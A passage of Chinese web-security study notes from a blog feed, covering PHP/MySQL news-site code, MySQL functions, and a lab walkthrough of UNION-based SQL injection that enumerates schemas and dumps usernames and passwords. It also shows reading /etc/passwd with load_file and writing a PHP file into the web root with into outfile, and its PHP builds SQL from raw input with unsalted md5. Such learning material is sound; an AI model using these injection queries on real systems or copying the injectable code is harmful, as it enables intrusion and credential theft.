&apos;$passFirst&apos; WHERE `username`=&apos;$username&apos;;&quot;;</span><br><span class="line">        echo $sql;</span><br><span class="line">        $result = mysql_query($sql) or die(mysql_error());</span><br><span class="line">        if (mysql_affected_rows()) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;更新成功！&apos;);location.href=&apos;login.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&quot;&lt;script&gt;alert(&apos;更新失败！&apos;);location.href=&apos;findPasswd.php&apos;;&lt;/script&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="四、点赞功能"><a href="#四、点赞功能" class="headerlink" title="四、点赞功能"></a>四、点赞功能</h3><h4 id="up-down-php"><a href="#up-down-php" class="headerlink" title="up_down.php"></a>up_down.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style &gt;</span><br><span class="line">    .th&#123;</span><br><span class="line">        vertical-align: middle;</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;../js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    Require_once &quot;sql.php&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;width:100%;text-align:center&quot;&gt;</span><br><span class="line">    &lt;h1&gt;新闻界面&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;table align=&quot;center&quot; border=&quot;1&quot; width=&quot;1200&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;热度&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;标题&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;作者&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;时间&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">        &lt;th width=&quot;150px&quot;&gt; &lt;h2&gt;操作&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//$uers_id = $_SESSION[&quot;user_id&quot;];</span><br><span class="line">$user_id=13;</span><br><span class="line">$storeUidType = array();</span><br><span class="line">$result = mysql_query(&quot;select * from tb_news order by hot desc;&quot;);</span><br><span class="line">//======================================================================================</span><br><span class="line">$readNews = mysql_query(&quot;select * from `tb_hot` where `user_id`=$user_id&quot;);</span><br><span class="line">//把用户对新闻的评价保存在一个数组里</span><br><span class="line">//$storeUidType[news_id] = type</span><br><span class="line">while($arr1 = mysql_fetch_assoc($readNews)) &#123;</span><br><span class="line">    $hotUser_id = $arr1[&apos;user_id&apos;];</span><br><span class="line">    $hotNews_id = $arr1[&apos;news_id&apos;];</span><br><span class="line">    $hotType = $arr1[&apos;type&apos;];</span><br><span class="line">    $storeUidType[$hotNews_id] = $hotType;</span><br><span class="line">&#125;</span><br><span class="line">//echo $storeUidType;</span><br><span class="line">//======================================================================================</span><br><span class="line">while($arr = mysql_fetch_assoc($result))&#123;</span><br><span class="line">    $title = base64_decode($arr[&apos;title&apos;]);</span><br><span class="line">    //var_dump($title);</span><br><span class="line">    $contents = base64_decode($arr[&apos;contents&apos;]);</span><br><span class="line">    $author = base64_decode($arr[&apos;author&apos;]);</span><br><span class="line">    $new_img = $arr[&apos;new_img&apos;];</span><br><span class="line">    $add_time = $arr[&apos;add_time&apos;];</span><br><span class="line">    $Hot = $arr[&apos;hot&apos;];</span><br><span class="line">    //读取新闻ID</span><br><span class="line">    $id = $arr[&apos;id&apos;];</span><br><span class="line">    //=============================================</span><br><span class="line">    //用户还没有对新闻进行评价，颜色设置成黑色</span><br><span class="line">    if($storeUidType[$id]==1)&#123;</span><br><span class="line">        $upColor = &quot;red&quot;;</span><br><span class="line">        $downColor = &quot;black&quot;;</span><br><span class="line">    &#125;elseif($storeUidType[$id]==-1)&#123;</span><br><span class="line">        $upColor = &quot;black&quot;;</span><br><span class="line">        $downColor = &quot;red&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $upColor = &quot;black&quot;;</span><br><span class="line">        $downColor = &quot;black&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    //=============================================</span><br><span class="line">    $idUp = &apos;btnUp&apos; . $id;</span><br><span class="line">    $idDown = &apos;btnDown&apos; . $id;</span><br><span class="line">    $tu = base64_decode($new_img);</span><br><span class="line">    echo</span><br><span class="line">            &lt;&lt;&lt;EOF</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&#123;$Hot&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&#123;$title&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&#123;$author&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&#123;$add_time&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot; rowspan=&quot;2&quot;&gt;</span><br><span class="line">                &lt;p&gt;                  </span><br><span class="line">                    &lt;button id=$idUp style=&apos;color: $upColor&apos; onclick=&apos;btnUpAct(this.id)&apos;&gt;赞&lt;/button&gt;/</span><br><span class="line">                    &lt;button id=$idDown style=&apos;color: $downColor&apos; onclick=&apos;btnDownAct(this.id)&apos;&gt;踩&lt;/button&gt;                    </span><br><span class="line">                &lt;/p&gt;</span><br><span class="line">                </span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot; height: 30px; width: 300px; text-align: center;&gt;</span><br><span class="line">            &lt;img height=&quot;150px&quot; src=&#123;$tu&#125;&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td colspan=&quot;3&quot; align=&quot;center&quot; &gt;&lt;a href=&quot;xinwenzhanshimore.php?action=&#123;$title&#125;&quot;&gt;&#123;$contents&#125;&lt;/a&gt; </span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">             &lt;script&gt;</span><br><span class="line">                function btnUpAct(id)&#123;                   </span><br><span class="line">                    if(id==&apos;$idUp&apos;)&#123;</span><br><span class="line">                        if(document.getElementById(id).style.color == &quot;red&quot;)&#123;</span><br><span class="line">                            alert(&apos;您已点过赞了！&apos;);</span><br><span class="line">                        &#125;else&#123;</span><br><span class="line">                            document.getElementById(id).style.color=&quot;red&quot;;</span><br><span class="line">                            document.getElementById(&apos;$idDown&apos;).style.color=&quot;black&quot;; </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                function btnDownAct(id)&#123;</span><br><span class="line">                    if(id==&apos;$idDown&apos;)&#123;</span><br><span class="line">                        if(document.getElementById(id).style.color == &quot;red&quot;)&#123;</span><br><span class="line">                            alert(&apos;您已点过踩了！&apos;);</span><br><span class="line">                        &#125;else&#123;</span><br><span class="line">                            document.getElementById(id).style.color=&quot;red&quot;;</span><br><span class="line">                            document.getElementById(&apos;$idUp&apos;).style.color=&quot;black&quot;;        </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;               </span><br><span class="line">            &lt;/script&gt;</span><br><span class="line">EOF;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="五、问题与总结"><a href="#五、问题与总结" class="headerlink" title="五、问题与总结"></a>五、问题与总结</h3><p>新闻展示、个人信息、找回密码三个功能均可完美实现。点赞功能还是有些问题，从数据库中读取数据，新闻展示界面把该用户对每条新闻的赞踩显示出红色，在按钮添加事件，当颜色为红色时，再次点击该按钮会提示已操作过。用这种思路写出来，只是最后一条新闻功能实现是正确，后来查资料得知，<code>js</code>事件用于循环时只对最后一条有作用，需用闭包解决。需换思路！</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> MySQL </tag>
            
            <tag> 新闻管理系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note23</title>
      <link href="/2019/08/16/note23/"/>
      <url>/2019/08/16/note23/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 用PHP操作MySQL数据库</p><a id="more"></a><!--export--><h3 id="一、常用函数"><a href="#一、常用函数" class="headerlink" title="一、常用函数"></a>一、常用函数</h3><table><thead><tr><th>函数名称</th><th>作用</th></tr></thead><tbody><tr><td>mysql_connect(host, uname, passwd)</td><td>进行数据库连接</td></tr><tr><td>mysql_select_db(‘database’)</td><td>选择数据库</td></tr><tr><td>mysql_query(sql)</td><td>向数据库发送指令</td></tr><tr><td>mysql_fetch_array()</td><td>获取数据集中一行数据</td></tr><tr><td>mysql_fetch_row()</td><td>获取数字索引数组</td></tr><tr><td>mysql_fetch_assoc()</td><td>获取关联索引数组</td></tr></tbody></table><h3 id="二、循环遍历查询结果"><a href="#二、循环遍历查询结果" class="headerlink" title="二、循环遍历查询结果"></a>二、循环遍历查询结果</h3><h4 id="1-while"><a href="#1-while" class="headerlink" title="1. while"></a>1. while</h4><p><code>sql.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> $host = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$username = <span class="string">'root'</span>;</span><br><span class="line">$password = <span class="string">'root'</span>;</span><br><span class="line">@$con = mysql_connect($host, $username, $password) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); </span><br><span class="line">mysql_query(<span class="string">'set names "utf8"'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">'sql.php'</span>;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM `content`;"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($arr = mysql_fetch_assoc($result))&#123;</span><br><span class="line">        $title = $arr[<span class="string">'title'</span>];</span><br><span class="line">        $author = $arr[<span class="string">'author'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $author. <span class="string">'-&gt;'</span> . $title;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-for"><a href="#2-for" class="headerlink" title="2. for"></a>2. for</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'sql.php'</span>;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM `content`;"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;mysql_affected_rows(); $i++)&#123;</span><br><span class="line">        $arr = mysql_fetch_assoc($result);</span><br><span class="line">        $title = $arr[<span class="string">'title'</span>];</span><br><span class="line">        $author = $arr[<span class="string">'author'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $author. <span class="string">'-&gt;'</span> . $title;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="三、对密码的处理"><a href="#三、对密码的处理" class="headerlink" title="三、对密码的处理"></a>三、对密码的处理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//若$_SESSION['uname']为空则跳转到登录页面</span></span><br><span class="line"><span class="keyword">if</span>(!$_SESSION(<span class="string">'uname'</span>))&#123;</span><br><span class="line">        header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">@$old_pass = $_POST[<span class="string">'old_pass'</span>];</span><br><span class="line">@$new_pass = $_POST[<span class="string">'new_pass'</span>];</span><br><span class="line">@$new_pass_again = $_POST[<span class="string">'new_pass_again'</span>];</span><br><span class="line"><span class="keyword">if</span>($old_pass &amp;&amp; $new_pass &amp;&amp; $new_pass_again)&#123;</span><br><span class="line">        <span class="keyword">if</span>($new_pass != $new_pass_again)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;script&gt;alert('两次输入密码不一致，请重新输入!')&lt;/script&gt;"</span>)；</span><br><span class="line">        &#125;</span><br><span class="line">     $pass = md5($new_pass);</span><br><span class="line">        $uid = $_SESSION[<span class="string">'uid'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'sql.php'</span>;</span><br><span class="line">        $sql = <span class="string">"UPDATE `users` SET `passwd` = '&#123;$pass&#125;' WHERE `id`=&#123;$uid&#125;;"</span>;</span><br><span class="line">        $result = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(mysql_affected_rows())&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("密码修改成功！");&lt;/script&gt;'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("密码修改成功！");&lt;/script&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note22</title>
      <link href="/2019/08/13/note22/"/>
      <url>/2019/08/13/note22/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: MYSQL常用函数的讲解</p><a id="more"></a><!--export--><h3 id="一、常用函数"><a href="#一、常用函数" class="headerlink" title="一、常用函数"></a>一、常用函数</h3><table><thead><tr><th>函数名</th><th>作用</th></tr></thead><tbody><tr><td>version()</td><td>返回数据库的版本号</td></tr><tr><td>database()</td><td>返回当前数据库名</td></tr><tr><td>user()</td><td>返回当前用户</td></tr><tr><td>system_user()</td><td>返回当前用户</td></tr></tbody></table><ul><li>concat(s1, s2, …, sn)字符串s1，s2等多个字符串合并为一个字符串。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- MY SQL FUNCTION</span><br><span class="line">SELECT CONCAT(&quot;MY &quot;, &quot;SQL &quot;, &quot;FUNCTION &quot;);</span><br></pre></td></tr></table></figure><ul><li>concat_ws(x, s1, s1, …, sn)把字符串合并成一个字符串，两两间以x连接。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- I-LOVE-SQL</span><br><span class="line">SELECT CONCAT_WS(&quot;-&quot;, &quot;I&quot;, &quot;LOVE&quot;, &quot;SQL&quot;);</span><br></pre></td></tr></table></figure><ul><li>group_concat(s1, ‘ ‘, s2  )返回一个字符串结果，该结果由分组中的值连接组合而成。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(username, &apos;-&apos;, passwd) FROM `USERS`;</span><br></pre></td></tr></table></figure><ul><li>left(s, n)返回字符串s前n个字符。 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- hello</span><br><span class="line">SELECT LEFT(&apos;hello world&apos;, 5);</span><br><span class="line">-- helllo w</span><br><span class="line">SELECT LEFT(&apos;hello world&apos;, 7);</span><br></pre></td></tr></table></figure><ul><li>right(s, n)返回字符串s的后n个字符。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- o world</span><br><span class="line">SELECT RIGHT(&apos;hello world&apos;, 7);</span><br></pre></td></tr></table></figure><ul><li>substr/substring(s, start, length)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- o </span><br><span class="line">SELECT SUBSTR(&apos;hello world&apos;, 5, 2);</span><br><span class="line">SELECT SUBSTRING(&apos;hello world&apos;, 5, 2);</span><br><span class="line">-- o wo</span><br><span class="line">SELECT SUBSTR(&apos;hello world&apos;, 5, 4);</span><br><span class="line">SELECT SUBSTRING(&apos;hello world&apos;, 5, 4);</span><br></pre></td></tr></table></figure><ul><li>mid(s, n, len)从字符串s的start位置截取长度为length的子字符串</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- o w</span><br><span class="line">SELECT MID(&apos;hello world&apos;, 5, 3);</span><br></pre></td></tr></table></figure><ul><li>DISTINCT 过虑重复的记录</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT name FROM user;</span><br></pre></td></tr></table></figure><ul><li>UNION操作符用于合并两个或多个SELECT语句的结果集</li></ul><p><strong>NOTE</strong>: UNION内部的每个SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型。UNION在进行表连接后会筛选掉重复的记录，UNION ALL只是简单的将两个结果合并后返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段名 FROM 表1 UNION SELECT 字段名 FROM 表2</span><br></pre></td></tr></table></figure><ul><li><p>ORDER BY在SQL注入中用于判断字段数，然后用UNION用于输出信息。</p></li><li><p>LIKE</p></li></ul><table><thead><tr><th>操作符</th><th>左右</th></tr></thead><tbody><tr><td>_</td><td>代表任意单个字符</td></tr><tr><td>%</td><td>代表任意多字符</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;b%&apos;;</span><br><span class="line">SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;%o%&apos;;</span><br><span class="line">SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;admi_&apos;;</span><br><span class="line">-- 把标题中含有1作者名含有1值含有1的数据列出</span><br><span class="line">SELECT * FROM test.content WHERE title LIKE &apos;%1%&apos; or author like &apos;%1%&apos; or value like %1%&apos;&apos;</span><br></pre></td></tr></table></figure><p><code>like</code>  <code>%q%</code>包含q的      <code>%q</code> q在结尾      <code>q%</code>   q在开头</p><h3 id="二、读写文件"><a href="#二、读写文件" class="headerlink" title="二、读写文件"></a>二、读写文件</h3><h4 id="1-写文件"><a href="#1-写文件" class="headerlink" title="1. 写文件"></a>1. 写文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 绝对路径</span><br><span class="line">into dumpfile &quot;filepath&quot;</span><br><span class="line">-- 绝对路径</span><br><span class="line">into outfile &quot;filepath&quot;</span><br><span class="line">select 123 into outfile/dumpfile &apos;/var/www/html/eval.php&apos;;</span><br></pre></td></tr></table></figure><h4 id="2-读文件"><a href="#2-读文件" class="headerlink" title="2. 读文件"></a>2. 读文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-- 绝对路径</span><br><span class="line">load_file(&apos;filepath&apos;)</span><br><span class="line">select load_file(&apos;/etc/passwd&apos;);</span><br><span class="line">create table data(</span><br><span class="line">data text</span><br><span class="line">)</span><br><span class="line">insert into data values(load_file(&apos;&apos;));</span><br></pre></td></tr></table></figure><p>load file: 读取文件并以字符串形式返回文件内容。</p><p>into outfile: 将所选行写入文件，该文件会在服务器主机上进行创建，所以你必须要有执行这条命令的权限，还要注意要写入文件不能是现有的文件。如：/etc/passwd</p><p><em>以下内容不太懂，先记住</em></p><p>文件转十六进制，然后unhexo into dumpfile</p><p>本地使用hex(load file(‘path’))处理二进制文件</p><p>服务器上，执行select unhex(0x十六进制内容) into dumpfile “/tmp/a.exe”</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>练习7</title>
      <link href="/2019/08/13/practice7/"/>
      <url>/2019/08/13/practice7/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 先在数据库中使用<code>UNION</code>写<code>SQL</code>查出数据库版本，库，表，列等信息，再在<code>index.php</code>中操作一遍。</p><a id="more"></a><!--export--><h3 id="一、首先确定列数"><a href="#一、首先确定列数" class="headerlink" title="一、首先确定列数"></a>一、首先确定列数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 先用order by根据是否报错确定列数</span><br><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 4;</span><br><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 5;</span><br><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 6;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/orderBy.png" alt></p><p>由输出结果可知，共有五列。</p><h3 id="二、读取数据"><a href="#二、读取数据" class="headerlink" title="二、读取数据"></a>二、读取数据</h3><h4 id="1-确定库名"><a href="#1-确定库名" class="headerlink" title="1. 确定库名"></a>1. 确定库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT version(), (SELECT group_concat(schema_name) FROM information_schema.schemata), 3, 4, 5;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/1schema.png" alt></p><h4 id="2-确定表名"><a href="#2-确定表名" class="headerlink" title="2. 确定表名"></a>2. 确定表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (select group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;mynews&apos;), 3, 4, 5 limit 1,1;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/2mynew.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (select group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;test&apos;), 3, 4, 5 limit 1,1;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/3test.png" alt></p><p>对库进行一一查询，找到目标库</p><h4 id="3-列名"><a href="#3-列名" class="headerlink" title="3. 列名"></a>3. 列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos;), 3, 4, 5 limit 1,1;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/4contentCo.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos;), 3, 4, 5 limit 1,1;</span><br></pre></td></tr></table></figure><p>可以看到有重复的字段，原因是昨天练习数据库导入时，对同一<code>.sql</code>文件导入不同的库，即不同库里存着名为<code>users</code>和<code>content</code>的表。加上限定条件即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &apos;admin&apos; UNION SELECT 1,2,3,4,group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME=&apos;users&apos; AND TABLE_SCHEMA=&apos;test&apos;;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/5limit.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(username, passwd) FROM `test`.`content`), 3, 